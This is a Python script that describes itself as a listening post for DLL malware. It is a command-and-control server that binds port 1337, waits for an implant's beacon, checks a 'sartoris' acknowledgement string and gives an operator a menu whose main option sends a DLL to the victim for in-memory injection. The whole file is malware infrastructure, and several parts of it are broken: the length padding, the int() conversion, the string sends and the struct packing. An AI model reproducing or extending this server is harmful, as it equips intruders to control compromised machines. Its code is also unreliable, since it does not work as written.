#!/usr/bin/python3

# Simple LP for .dll malware
# messages to client are of the form (type, length, value)

# Options are:
# 0: do something
# 1: do something else
# 2: another thing
# 3: more stuff
# 4: send a .dll

import socket
import binascii
import socket
import struct
import sys
import os.path
from pathlib import Path

SERVER_PORT = 1337
BUFFER_SIZE = 1024

# Define message types
RESERVED_TYPE1 = 0x01000000
RESERVED_TYPE2 = 0x02000000
RESERVED_TYPE3 = 0x03000000
DLL_TYPE = 0x04000000

# Max DLL File size
MAX_FILE_SIZE = 0xFFFFFFFF


print("***** Python .dll listening post *****\n")
print("Starting the listening post. . . \n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Stop the socket from complaing about address alredy in use
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('10.1.20.40', SERVER_PORT))
s.listen(1)
print("Server started.\n")

# Eventually here you'd want to start a new thread for each received beacon
print("Please wait while we receive a beacon from the client. . .\n")

# Wait for connect
conn, addr = s.accept()
print("Got connection from: ", addr)
# Get data

data = conn.recv(BUFFER_SIZE)
# If we get empty ACK then break
print("Data: ", data)
if not data:
	print("Got no data from client, exiting . . .\n")
	conn.close()
	exit()

# Receive ACK string
if('sartoris' in str(data)):
	print("Received ACK string: ", data)
else:
	print("Did not receive proper ACK from client, exiting. . .")
	conn.close()
	exit()

# Eventually here we want a menu that lists all beaconing clients with
# IP, Port, hostname, OS, etc and allow us to choose from a list of ones we
# want to interact, or even send commands to multiple clients at once
while True:
	print("Please select a command to send to ", addr)
	print("(0) Quit\n(1) Do Something\n(2) Do Something Else \
		\n(3) Do another thing\n(4) Memory Inject DLL\n")

	choice = input(">>> ").rstrip()

	# If choice isn't a positive number
	if not choice.isdigit():
		print("You must specify a valid digit 0-4!\n")

	else:
		# Check if input is an int	
		try:
			user_input = int(choice)
		except ValueError:
			print("You must enter a number!")

		# If choice isn't a value from 0 to 4
		if user_input < 0 or user_input > 4:
			print("Please select a number 0-4!\n")
		# User chose Quit
		elif user_input == 0:
			print("Exiting . . .\n")
			break
		elif user_input == 1:
			print("Got choice 1")
			conn.send("000100010A")
		elif user_input == 2:
			print("Got choice 2")
			conn.send("000200010A")
		elif user_input == 3:
			print("Got choice 3")
			conn.send("000300010A")
		elif user_input == 4:
			# Prompt for user input
			print("Enter the name of the dll to load")
			filename = input(">>> ")

			# Open the file in binary mode
			f = open(filename, "rb")

			# Get the integer file size of the file
			length = os.path.getsize(filename)
			# Calculate the difference from length and max size
			lendiff = MAX_FILE_SIZE - length
			# Convert length to binary number
			length_bytes = bin(length)
			length_bytes += "\0"*lendiff

			# Read the file data into file_bytes
			file_bytes = f.read()


			# get the file bytes count, store it in  "length"
			# pack the file bytes into a variable
			# send it out as type, length, value
			print(length)
			print("\n")
			print(length_bytes)

			values = (DLL_TYPE, int(length_bytes))
			packer = struct.Struct('L L')
			packed_data = packer.pack(*values)
			packed_data += struct.pack(file_bytes)


			print('sending "%s"' % binascii.hexlify(packed_data), values)

			conn.sendall(packed_data)
		else:
			print("Didn't understand input")
		

